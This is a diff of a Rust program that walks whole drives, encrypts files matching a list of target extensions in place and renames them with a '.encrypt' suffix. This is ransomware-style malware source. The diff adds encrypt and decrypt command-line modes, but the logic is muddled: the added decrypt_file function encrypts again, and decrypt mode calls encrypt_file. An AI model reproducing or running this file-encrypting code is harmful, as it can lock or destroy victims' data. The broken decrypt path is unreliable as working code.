@@ -5,6 +5,7 @@ use std::fs;
 use std::path::Path;
 use std::{str, vec};
 use walkdir::{self, Error, WalkDir};
+use std::env;
 
 lazy_static! {
     static ref kIncludeBackfix: Vec<&'static str> =
@@ -28,6 +29,13 @@ pub fn encrypt_file(path: &Path) {
     fs::rename(path, format!("{}.encrypt", path.display()));
 }
 
+pub fn decrypt_file(path: &Path) {
+    let mut buffer = fs::read(path).expect("");
+    encrypt_buffer(&mut buffer);
+    fs::write(path, buffer);
+    fs::rename(path, format!("{}.encrypt", path.display()));
+}
+
 fn main() -> Result<(), Error> {
 
     // this is my computer
@@ -36,19 +44,48 @@ fn main() -> Result<(), Error> {
         return Ok(());
     }
 
+    let args: Vec<String> = env::args().collect();
+    dbg!(&args);
+
+    let mut encrypt:bool=false;
+    if args[1] == "-e"{
+        encrypt=true;
+        println!("encrypt mode");
+    }
+    else if args[1] == "-d"{
+        encrypt=false;
+        println!("decrypt mode");
+    }
+    else {
+        panic!()
+    }
+
     for HardDriver in kHardDriver.iter() {
         for entry in WalkDir::new(HardDriver) {
             match entry {
                 Ok(DirEntry) => {
+                    if encrypt{
                     // 判断指定文件是否符合目标后缀
                     let BackfixInclude = false;
                     for iter in kIncludeBackfix.iter() {
                         if DirEntry.file_name().to_str().unwrap().ends_with(iter) {
                             // 打印文件
-                            println!("{}", DirEntry.path().display());
-                            encrypt_file(DirEntry.path());
+                            println!("加密 {}", DirEntry.path().display());
+                            //encrypt_file(DirEntry.path());
                         }
                     }
+                }
+                else{
+                    if DirEntry.file_name().to_str().unwrap().ends_with(".encrypt"){
+                        println!("解密 {}", DirEntry.path().display());
+
+                        encrypt_file(DirEntry.path());
+                    }
+
+                }
+
+                    
+
                 }
                 Err(error) => {}
             }
